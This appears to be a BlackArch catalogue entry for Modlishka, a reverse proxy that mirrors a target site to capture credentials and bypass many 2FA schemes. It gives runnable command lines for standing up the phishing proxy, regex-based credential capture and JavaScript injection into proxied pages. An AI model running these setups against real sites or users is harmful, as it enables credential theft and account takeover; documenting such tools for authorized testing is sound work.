---
name: "modlishka"
categories:
  - blackarch-proxy
version: "v.1.1.1.r11.g214dd6c"
homepage: "https://github.com/drk1wi/Modlishka"
packaged-by: [blackarch]
blackarch-builddate: "2026-08-24"
build-system: go
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "drk1wi/Modlishka"
github-stars: 5441
github-pushed: "2026-08-14"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 7.0
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 8
gh-activity-checked: "2026-11-09"
---

# modlishka

> Transparent man-in-the-middle reverse proxy that mirrors a target site — TLS and multi-domain traffic included — onto one proxy domain and captures credentials, defeating many 2FA schemes, with no certificate installed on the client.

## What it's for

Modlishka is a Go reverse proxy by Piotr Duszyński (drk1wi) built for authorized adversary-in-the-middle simulations. It proxies an arbitrary target domain through a proxy domain the operator controls, rewriting links, cookies and JavaScript on the fly so the victim's browser keeps working normally — including sites that span multiple domains and TLS, without installing any certificate on the client. It was the first publicly released research tool to demonstrate automated bypass of common 2FA implementations (2019), which made it a standard for showing 2FA scheme weaknesses in phishing simulations. Beyond phishing it works as a universal transparent reverse proxy: wrapping legacy HTTP sites in TLS, confusing crawlers, and injecting JavaScript payloads. It is driven entirely by command-line flags or a JSON config file — it is not an interactive, hand-driven interception proxy.

The binary is `dist/proxy` after a `make` build; the BlackArch package installs it as `modlishka`.

## Typical use cases

### Stand up an AitM proxy for a target domain

```
modlishka -proxyDomain proxy.example.com -target target.example.com -controlCreds user:Password1
```

Outcome: Modlishka listens on :80 and :443 for `proxy.example.com`, transparently proxies `target.example.com` (TLS included, certificates generated on the fly), and serves captured credentials at the control URL path (default `/SayHello2Modlishka`) protected by the given credentials.

### Define credential capture with regexps

```
modlishka -proxyDomain proxy.example.com -target target.example.com -credParams base64(username_regex),base64(password_regex) -postOnly
```

Outcome: only HTTP POST requests are logged, and the base64-encoded regexp groups mark which intercepted fields are treated as username and password on the credentials page.

### Drive the proxy from a JSON config

```
modlishka -config config.json
```

Outcome: every option (proxy domain, target, ports, plugins, rules) is read from the JSON file instead of command-line switches — the repo ships ready-made templates under `templates/`.

### Inject JavaScript into proxied pages

```
modlishka -proxyDomain proxy.example.com -target target.example.com -jsRules 'target.example.com:base64(alert(1))'
```

Outcome: pages whose URL matches the pattern get the base64-decoded payload injected, so client-side behavior can be tested from the proxy side.

### Egress target fetches through another proxy

```
modlishka -proxyDomain proxy.example.com -target target.example.com -proxyAddress http://127.0.0.1:8080
```

Outcome: all of Modlishka's outgoing requests to the target traverse the given HTTP/SOCKS upstream — useful to chain it behind an interception proxy or anonymizing hop.

### Serve a legacy site over TLS only

```
modlishka -proxyDomain proxy.example.com -target target.example.com -forceHTTPS
```

Outcome: clear-text is stripped and all traffic between client and proxy is forced over HTTPS, effectively TLS-wrapping a legacy HTTP site.

*No corpus evidence — derived from upstream documentation.*
